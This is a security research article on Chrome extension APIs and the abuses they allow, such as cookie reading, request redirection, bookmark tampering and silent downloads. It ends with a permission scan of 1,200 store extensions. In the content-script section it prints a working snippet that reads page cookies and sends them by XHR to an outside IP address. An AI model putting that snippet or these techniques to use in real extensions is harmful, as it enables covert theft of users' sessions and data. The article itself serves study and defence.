**Author: LoRexxar'@Knownsec 404 Team  
Chinese Version: <https://paper.seebug.org/1092/>**

In early 2019, Microsoft chose Chromium as the default browser and abandoned
the development of Edge. And on April 8, 19, Edge officially released the Edge
Dev browser developed based on Chromium, and provided supporting plug-in
management compatible with Chrome Ext. Chrome's plug-in system is increasingly
affecting the general population.

In this context, the security of Chrome Ext should also receive due attention.
"Getting Started with Chrome Ext Security from Zero" will start from the most
basic plug-in development, and gradually study the security issues from
various perspectives such as malicious plug-in and how malicious web pages use
plug-in to attack.

  * [Getting Started with Chrome Ext Security from Zero（1） -- A New Chrome Ext](https://paper.seebug.org/1094/ "Getting Started with Chrome Ext Security from Zero（1） -- A New Chrome Ext")

In the last part, we mainly talked about the most basic plug-in development.
After that, we will discuss the security issues of Chrome Ext. In this
article, we mainly start around Chrome Ext's API and explore how many browsers
can be implemented at the plug-in level. operating.

# Begining From a Simple Page

In order to explore the functional scope of the plugin, first we set up a
simple page.

    
    
    <?php
    setcookie('secret_cookie', 'secret_cookie', time()+3600*24);
    ?>
    
    test pages

Next, we will explore various possible security issues and attack about the
functions of the Chrome ext api.

# Chrome ext js

## content-script

Content-script is the core function code of the plugin. Generally speaking,
the main JS code will appear in the content-script.

The way it was introduced was mentioned in the previous article. It needs to
be set in manfest.json.

    
    
    "content_scripts": [
       {
         "matches": ["http://*.nytimes.com/*"],
         "css": ["myStyles.css"],
         "js": ["contentScript.js"]
       }
     ],

  * <https://developer.chrome.com/extensions/content_scripts>

The main feature of content_script js is that it loads at the same time as the
page, can access the dom, and can also call some APIs such as extension and
runtime, but not many, mainly used for interaction with the page.

`content_script js` can set the timing of corresponding script loading by
setting`run_at`.

  * document_idle is the default value, generally after the page dom is loaded and before the window.onload event fires
  * after document_start is loaded for css, before constructing page dom
  * document_end is after the dom is completed and before the resources such as pictures are loaded.

In addition, `content_script js` allows setting`all_frames` to make
`content_script js` act on all`frames` in the page. This configuration is off
by default because it is an unsafe configuration.

You can directly access the following Chrome Ext APIs in `content_script js`:

  * i18n
  * storage
  * runtime:
    * connect
    * getManifest
    * getURL
    * id
    * onConnect
    * onMessage
    * sendMessage

After understanding the basic configuration, let's take a look at what kind of
security issues `content_script js` can cause to a page.

### Security Issue

For `content_script js`, the first problem is that the plug-in can get the dom
of the page. In other words, the plug-in can operate all the dom in the page,
including non-httponly cookies.

Here we simply write following code into the `content_script js`.

    
    
    console.log(document.cookie);
    console.log(document.documentElement.outerHTML);
    var xhr = new XMLHttpRequest();
    xhr.open("get", "http://212.129.137.248?a="+document.cookie, false);
    xhr.send()

refresh the pages and load Plugin

![](https://images.seebug.org/content/images/2019/12/334b9d65-71e3-4e1d-9200-19ea24a36470.png-w331s)

The dom information in the page was successfully obtained, and if we sent the
message across domains through xhr, we also successfully received this request
in the background.

![](https://images.seebug.org/content/images/2019/12/106115ba-3864-49b4-8a93-d7641add79db.png-w331s)

This means that if the plug-in author maliciously modifies the dom in the
plug-in, or even obtains the dom value and sends it out, it can be done in a
way that browser users do not feel.

In the entire browser plug-in system, this problem exists at all levels, among
which `content_script js`,`injected script js`, and `devtools js` can directly
access the operation dom, and popup js and background js can be accessed
through chrome .tabs.executeScript to dynamically execute js, you can also
execute js to modify the dom.

In addition to the previous problems, in fact, the chrome api that can be
accessed by `content_script js` is very small, and it does not involve any
security, which is not mentioned here.

## popup/background js

The two main differences between popup js and backround js are the timing of
loading. Since they cannot access the dom, these two parts of js rely on
event-driven in the browser.

The main difference is that background js will continue to execute after the
event is triggered, and it will not end until all visible views and ports are
closed. It is worth noting that the corresponding events are connected to the
page opening and clicking the expansion button, without directly affecting the
loading of the plugin.

In addition, the most important feature of these two parts of js is that they
can call most of the chrome ext apis. We will explore various APIs later.

## devtools js

devtools js is a special system in the plug-in system. If we generally call
F12 a developer tool, devtools js is a developer tool for developer tools.

The permissions and domain restrictions are generally consistent with content
js, and the only special thing is that it can operate 3 special APIs:

  * chrome.devtools.panels: about panel;
  * chrome.devtools.inspectedWindow: Get information about the window being inspected;
  * chrome.devtools.network: get information about network requests;

These three APIs are also mainly used to modify F12 and obtain information,
and the others are not described in detail.

# Chrome Ext Api

## chrome.cookies

The chrome.cookies api needs to give domain permissions and cookies
permissions, as defined in manfest.json:

    
    
          {
            "name": "My extension",
            ...
            "permissions": [
              "cookies",
              "*://*.google.com"
            ],
            ...
          }

After applying for such permission, we can obtain all cookies under the
google.com domain by calling chrome.cookies.

There are 5 methods in total

  * get - chrome.cookies.get (object details, function callback) Get eligible cookies
  * getAll - chrome.cookies.getAll (object details, function callback) Get all matching cookies
  * set - chrome.cookies.set (object details, function callback) Setting cookies
  * remove - chrome.cookies.remove (object details, function callback) Delete cookie
  * getAllCookieStores - chrome.cookies.getAllCookieStores (function callback) List all stored cookies

And a event

  * chrome.cookies.onChanged.addListener(function callback) Events when cookies are deleted or changed

When plugins have cookie permissions, they can read and write all cookies
stored by the browser.

![](https://images.seebug.org/content/images/2019/12/2fc34b5d-7bca-4737-9be1-5ca70dc747e7.png-w331s)

## chrome.contentSettings

The chrome.contentSettings api is used to set the basic settings of the
browser when accessing a web page, including cookies, js, plugins and many
other configurations that take effect when accessing the web page.

Need to apply for permission of contentSettings in manifest.

    
    
      {
        "name": "My extension",
        ...
        "permissions": [
          "contentSettings"
        ],
        ...
      }

in contentSetting api, we can use method to modify setting.

    
    
    - ResourceIdentifier
    - Scope
    - ContentSetting
    - CookiesContentSetting
    - ImagesContentSetting
    - JavascriptContentSetting
    - LocationContentSetting
    - PluginsContentSetting
    - PopupsContentSetting
    - NotificationsContentSetting
    - FullscreenContentSetting
    - MouselockContentSetting
    - MicrophoneContentSetting
    - CameraContentSetting
    - PpapiBrokerContentSetting
    - MultipleAutomaticDownloadsContentSetting

## chrome.desktopCapture

chrome.desktopCapture can be used to take a screenshot (in real time) of the
entire screen, browser or a page.

You need to apply for desktopCapture permission in the manifest, and the
browser provides a method to get the media stream.

  * chooseDesktopMedia - integer chrome.desktopCapture.chooseDesktopMedia(array of DesktopCaptureSourceType sources, tabs.Tab targetTab, function callback)
  * cancelChooseDesktopMedia - chrome.desktopCapture.cancelChooseDesktopMedia(integer desktopMediaRequestId)

DesktopCaptureSourceType is set to "screen", "window", "tab", or "audio".

After obtaining the screenshot, this method will pass the media stream id to
the callback function. This id can be generated by the getUserMedia API. The
newly created streamid can only be used once and will expire in a few seconds.

Here is a simple demo.

    
    
    function gotStream(stream) {
      console.log("Received local stream");
      var video = document.querySelector("video");
      video.src = URL.createObjectURL(stream);
      localstream = stream;
      stream.onended = function() { console.log("Ended"); };
    }
    
    chrome.desktopCapture.chooseDesktopMedia(
    ["screen"], function (id) {
        navigator.webkitGetUserMedia({
            audio: false,
            video: {
                mandatory: {
                    chromeMediaSource: "desktop",
                    chromeMediaSourceId: id
                }
            }
        }, gotStream);
    }
    });

Here is a real-time stream.

![](https://images.seebug.org/content/images/2019/12/a0352dea-f942-488a-965b-70bf0be8d5fd.png-w331s)

## chrome.pageCapture

The method of chrome.pageCapture is similar to desktopCapture. You need to
apply for pageCapture permission in the manifest.

    
    
      {
        "name": "My extension",
        ...
        "permissions": [
          "pageCapture"
        ],
        ...
      }

This is a only one method.

  * saveAsMHTML - chrome.pageCapture.saveAsMHTML(object details, function callback)

By calling this method, you can get the source code of the page under any tab
of the current browser and save it as an object in blob format.

The only problem is that you need to know the tabid first.

![
](https://images.seebug.org/content/images/2019/12/3450ac03-b6a4-4a74-827b-b1de2360ccca.png-w331s)

## chrome.tabCapture

chrome.tabCapture is similar to chrome.desktopCapture. The main difference is
that tabCapture can capture video and audio of tabs, which is more targeted
than desktopCapture.

It is also necessary to declare the tabCapture permission in advance.

Main method is:

  * capture - chrome.tabCapture.capture( CaptureOptions options, function callback)
  * getCapturedTabs - chrome.tabCapture.getCapturedTabs(function callback)
  * captureOffscreenTab - chrome.tabCapture.captureOffscreenTab(string startUrl, CaptureOptions options, function callback)
  * getMediaStreamId - chrome.tabCapture.getMediaStreamId(object options, function callback)

Most of the APIs here are used to capture media streams, which is not much
different from the use of desktopCapture.

## chrome.webRequest

chrome.webRequest is the primary user for observing and analyzing traffic and
allows requests to be intercepted, blocked, or modified during runtime.

In addition to the webRequest in the manifest, this API also has permissions
for the corresponding domain, such as `*: //*.*: *`, and it should be noted
that if you need to intercept the request, you also need the
webRequestBlocking permission.

    
    
    {
            "name": "My extension",
            ...
            "permissions": [
              "webRequest",
              "*://*.google.com/"
            ],
            ...
          }

  * <https://developer.chrome.com/extensions/webRequest>

Before understanding this API in detail, we must first understand the flow of
a request at the browser level and the corresponding event trigger.

![
](https://images.seebug.org/content/images/2019/12/739f54e3-4596-45f5-bca6-74abb5607a7d.png-w331s)

In the world of browser plug-ins, the corresponding event trigger is divided
into multiple levels, and each level performs processing one by one.

Since there are too many interfaces under this api, here is an example

    
    
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
          return {cancel: details.url.indexOf("://www.baidu.com/") != -1};
        },
        {urls: ["<all_urls>"]},
        ["blocking"]);

When visiting Baidu, the request will be blocked

![
](https://images.seebug.org/content/images/2019/12/1fa3e81b-4453-4d90-a1bc-280769dc0964.png-w331s)

When redirectUrl is set, a corresponding jump will be generated.

    
    
    chrome.webRequest.onBeforeRequest.addListener(
        function(details) {
            if(details.url.indexOf("://www.baidu.com/") != -1){
                return {redirectUrl: "https://lorexxar.cn"};
            }
        },
        {urls: ["<all_urls>"]},
        ["blocking"]);

Visit www.baidu.com at this time will jump to lorexxar.cn

It is mentioned in the documentation that through these APIs you can directly
modify the content submitted by the post.

## chrome.bookmarks

chrome.bookmarks is an API used to operate the chrome favorites bar, which can
be used to get, modify, and create favorites content.

You need to apply for bookmarks permission in the manifest.

When we use this api, not only can we get all the favorites list, but we can
also silently modify the links corresponding to the favorites.

![
](https://images.seebug.org/content/images/2019/12/cb89e63a-6c4b-45af-9ace-9b50f3a21590.png-w331s)
![
](https://images.seebug.org/content/images/2019/12/badc2467-5c17-4797-b357-3fe26e85a910.png-w331s)

## chrome.downloads

chrome.downloads is used to operate api related to download files in chrome,
you can create downloads, continue, cancel, pause, and even open the directory
of downloaded files or open downloaded files.

This api needs to apply for downloads permission in the manifest. If you want
to open the downloaded file, you also need to apply for downloads.open
permission.

    
    
    {
        "name": "My extension",
        ...
        "permissions": [
          "downloads",
          "downloads.open"
        ],
        ...
      }

Under this API, many related methods are provided

  * download - chrome.downloads.download(object options, function callback)
  * search - chrome.downloads.search(object query, function callback)
  * pause - chrome.downloads.pause(integer downloadId, function callback)
  * resume - chrome.downloads.resume(integer downloadId, function callback)
  * cancel - chrome.downloads.cancel(integer downloadId, function callback)
  * getFileIcon - chrome.downloads.getFileIcon(integer downloadId, object options, function callback)
  * open - chrome.downloads.open(integer downloadId)
  * show - chrome.downloads.show(integer downloadId)
  * showDefaultFolder - chrome.downloads.showDefaultFolder()
  * erase - chrome.downloads.erase(object query, function callback)
  * removeFile - chrome.downloads.removeFile(integer downloadId, function callback)
  * acceptDanger - chrome.downloads.acceptDanger(integer downloadId, function callback)
  * setShelfEnabled - chrome.downloads.setShelfEnabled(boolean enabled)

When we have the corresponding permissions, we can directly create a new
download. If it is a dangerous suffix, such as .exe, a corresponding dangerous
prompt will pop up.

![
](https://images.seebug.org/content/images/2019/12/6ac909e8-99a5-437d-8440-05e145c54561.png-w331s)

In addition to the method of pausing and canceling during the download
process, you can also open the directory where the file is located through
show or open the file directly.

But in addition to requiring additional open permissions, a prompt box will
pop up.

![
](https://images.seebug.org/content/images/2019/12/ef6ffe60-3a71-46aa-b121-6e24bf257658.png-w331s)

Correspondingly, you can download `file: /// C: / Windows / System32 /
calc.exe` and execute it, but there will be special danger prompts when
downloading and executing.

Conversely, if we are downloading a file identified as non-dangerous, then we
can silently download and open the file.

## chrome.history && chrome.sessions

chrome.history is an API for manipulating historical records. The difference
from our common browser history is that this API can only obtain the
historical discipline in the browser opened this time, and it should be noted
that only closed websites are Will be included in the history.

This api needs to apply history permission in the manfiest.

    
    
     {
        "name": "My extension",
        ...
        "permissions": [
          "history"
        ],
        ...
      }

All methods under api, mainly add, delete, change and check.

  * search - chrome.history.search(object query, function callback)
  * getVisits - chrome.history.getVisits(object details, function callback)
  * addUrl - chrome.history.addUrl(object details, function callback)
  * deleteUrl - chrome.history.deleteUrl(object details, function callback)
  * deleteRange - chrome.history.deleteRange(object range, function callback)
  * deleteAll - chrome.history.deleteAll(function callback)

The browser can get all the history after opening the browser this time.

![
](https://images.seebug.org/content/images/2019/12/03404ab3-0444-4d06-9836-c84c8206ce23.png-w331s)

in chrome ext api, a anther api similar to this is **chrome.sessions**.

This api is used to operate and respond to browser sessions. It also needs to
apply for sessions permission.

  * getRecentlyClosed - chrome.sessions.getRecentlyClosed( Filter filter, function callback)
  * getDevices - chrome.sessions.getDevices( Filter filter, function callback)
  * restore - chrome.sessions.restore(string sessionId, function callback)

Through this API, you can get the recently closed tag sessions, and you can
also resume.

![ ](https://images.seebug.org/content/images/2019/12/dde4f4cd-ee54-43b9-b7aa-c8a10d23a059.png-w331s)

## chrome.tabs

chrome.tabs is an api for manipulating tabs. It is one of the more important
apis of all apis. There are many special operations. In addition to
controlling tabs, you can also execute js in tabs and change css.

You can call most of the APIs in tabs without declaring any permissions, but
if you need to modify the tab's url and other properties, you need tabs
permissions. In addition, to execute js and modify css in tabs, you need
activeTab permissions.

  * get - chrome.tabs.get(integer tabId, function callback)
  * getCurrent - chrome.tabs.getCurrent(function callback)
  * connect - runtime.Port chrome.tabs.connect(integer tabId, object connectInfo)
  * sendRequest - chrome.tabs.sendRequest(integer tabId, any request, function responseCallback)
  * sendMessage - chrome.tabs.sendMessage(integer tabId, any message, object options, function responseCallback)
  * getSelected - chrome.tabs.getSelected(integer windowId, function callback)
  * getAllInWindow - chrome.tabs.getAllInWindow(integer windowId, function callback)
  * create - chrome.tabs.create(object createProperties, function callback)
  * duplicate - chrome.tabs.duplicate(integer tabId, function callback)
  * query - chrome.tabs.query(object queryInfo, function callback)
  * highlight - chrome.tabs.highlight(object highlightInfo, function callback)
  * update - chrome.tabs.update(integer tabId, object updateProperties, function callback)
  * move - chrome.tabs.move(integer or array of integer tabIds, object - moveProperties, function callback)
  * reload - chrome.tabs.reload(integer tabId, object reloadProperties, function callback)
  * remove - chrome.tabs.remove(integer or array of integer tabIds, function callback)
  * detectLanguage - chrome.tabs.detectLanguage(integer tabId, function callback)
  * captureVisibleTab - chrome.tabs.captureVisibleTab(integer windowId, object options, function callback)
  * executeScript - chrome.tabs.executeScript(integer tabId, object details, function callback)
  * insertCSS - chrome.tabs.insertCSS(integer tabId, object details, function callback)
  * setZoom - chrome.tabs.setZoom(integer tabId, double zoomFactor, function callback)
  * getZoom - chrome.tabs.getZoom(integer tabId, function callback)
  * setZoomSettings - chrome.tabs.setZoomSettings(integer tabId, ZoomSettings zoomSettings, function callback)
  * getZoomSettings - chrome.tabs.getZoomSettings(integer tabId, function callback)
  * discard - chrome.tabs.discard(integer tabId, function callback)
  * goForward - chrome.tabs.goForward(integer tabId, function callback)
  * goBack - chrome.tabs.goBack(integer tabId, function callback)

a simple example, if we get a tab, we can use update to redirect tab.

![
](https://images.seebug.org/content/images/2019/12/312906ce-7698-41e5-bce6-d16a24e8c253.png-w331s)

Similarly, in addition to controlling the links of any tab, we can also
create, move, copy, and highlight tab pages.

When we have activeTab permissions, we can also use captureVisibleTab to
intercept the current page and convert it into a data stream.

![ ](https://images.seebug.org/content/images/2019/12/72f53af1-ffa4-463a-a6de-ea33ab42aee3.png-w331s)

Similarly, we can use executeScript to execute js code, which is also the main
way for popups to communicate with the current page.

![
](https://images.seebug.org/content/images/2019/12/309fe7dc-f4a2-4dd7-9b0f-1a40a4ee6436.png-w331s)

Here I mainly sort out some APIs related to sensitive information, and the
discussion of the security issues of plug-ins will mainly focus on these APIs.

# chrome plugin permissions

After understanding the basic API, we must understand the permission system of
the chrome plug-in. After reading the api document, we can find that chrome
have very strictly plug-in system, but maybe because of this For plugin
developers, you may need to request too many permissions for plugins.

So in order to save trouble, chrome also gives a second permission declaration
method, which is the domain-based permission system.

you can register just like：

  * `"http://*/*",`
  * `"https://*/*"`
  * `"*://*/*",`
  * `"http://*/",`
  * `"https://*/",`

In this way, the domain-based permission application method also supports
`<all_urls>` to directly replace all.

In the later permission system, Chrome added `activeTab` instead
of`<all_urls>`. After the declaration of`activeTab`, the browser will give the
plug-in permission to operate the currently active tab, and will not declare
specific Permission requirements.

  * no activeTab

![
](https://images.seebug.org/content/images/2019/12/9a50a205-a86e-42e4-8afc-6b0716edd6c9.png-w331s)

  * activeTab

![
](https://images.seebug.org/content/images/2019/12/802ed310-92c9-4c53-bd52-3118d7920791.png-w331s)

When the activeTab permission is declared, you can perform the following
operations without any additional permissions:

  * Call tabs.executeScript and tabs.insertCSS
  * Get information of the page through tabs.Tab object
  * Get the domain permissions required by webRequest

In other words, when the plug-in applies for activeTab permission, even if the
browser information cannot be obtained, the tab page can be arbitrarily
operated.

What's more, for most plug-in users, they don't care about what permissions
the plug-in has applied for, so even if the plug-in developer needs permission
to apply, it will not affect the use. Under this concept, security issues
arise.

![
](https://images.seebug.org/content/images/2019/12/b0a9aff8-4d61-436f-99b0-1246b765fba4.png-w331s)

# Data in real world

After rough statistics, more than 40,000 chrome exts are now publicly
available on the chrome store, excluding browser plug-ins that are privately
distributed.

In order to be able to reflect the real world impact as much as possible, here
we randomly select 1200 chrome plugins and get some results from this part of
the plugin. It is worth noting that the permissions mentioned below do not
necessarily mean that the plugin is not secure, but when the plugin obtains
such permissions, it has the ability to complete the unrest Full operation.

Here we use Cobra-W's new Chrome ext scan function to scan and analyze the
1200 targets we selected.

<https://github.com/LoRexxar/Cobra-W>

    
    
     python3 cobra.py -t '..\chrome_target\' -r 4104 -lan chromeext -d

# `<all-url>`

After the plugin obtains similar permissions like `<all-url>` or `*: // * /
*`, the plugin can operate all open tabs and can execute arbitrary js and css
code silently.

We can scan with the following rules:

    
    
    class CVI_4104:
        """
        rule for chrome crx
    
        """
    
        def __init__(self):
            self.svid = 4104
            self.language = "chromeext"
            self.author = "LoRexxar"
            self.vulnerability = "Manifest.json permissions "
            self.description = "Manifest.json permissions "
    
            # status
            self.status = True
    
            #
            self.match_mode = "special-crx-keyword-match"
            self.keyword = "permissions"
            self.match = [
                "http://*/*",
                "https://*/*",
                "*://*/*",
                "<all_urls>",
                "http://*/",
                "https://*/",
                "activeTab",
            ]
    
            self.match = list(map(re.escape, self.match))
            self.unmatch = []
    
            self.vul_function = None
    
        def main(self, regex_string):
            """
            regex string input
            :regex_string: regex match string
            :return:
            """
            pass

a total of 585 plugins applied for related permissions in 1200 plugins we
randomly selected.

![
](https://images.seebug.org/content/images/2019/12/976e4922-940d-4427-8f63-5f17eef21b32.png-w331s)

Most of these plugins have applied for relatively wide coverage.

## other

Then we mainly scan the sensitive API permissions mentioned above. The number
of plugins related to permissions is as follows:

![
](https://images.seebug.org/content/images/2019/12/c350ecd7-86d8-4582-a15a-642f25ff9702.png-w331s)

# Reference

  * <https://developer.chrome.com/extensions/devguide>

# About Knownsec & 404 Team

Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.

Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.

404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.

The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1095/>

